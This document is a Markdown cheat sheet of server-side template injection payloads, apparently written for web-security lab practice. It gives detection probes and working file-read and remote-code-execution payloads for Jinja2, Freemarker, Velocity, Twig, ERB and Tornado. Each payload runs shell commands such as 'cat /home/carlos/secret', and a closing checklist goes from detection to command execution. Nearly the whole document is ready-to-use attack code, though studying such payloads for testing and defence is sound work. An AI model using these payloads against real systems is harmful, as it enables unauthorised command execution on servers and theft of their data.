# SSTI (Server-Side Template Injection) Payloads

## Detection

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

## Jinja2 (Python)

### Read File
```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}
```

### RCE
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
```

## Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("cat /home/carlos/secret") }
```

## Velocity (Java)

```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('cat /home/carlos/secret'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/carlos/secret")}}
{{['cat /home/carlos/secret']|filter('system')}}
```

## ERB (Ruby)

```ruby
<%= system('cat /home/carlos/secret') %>
<%= `cat /home/carlos/secret` %>
```

## Tornado (Python)

```python
{% import os %}
{{ os.popen('cat /home/carlos/secret').read() }}
```

## Quick Reference

1. Test: `{{7*7}}` → If returns `49`, SSTI confirmed
2. Identify engine using HackTricks
3. Use engine-specific RCE payload
4. Read `/home/carlos/secret`
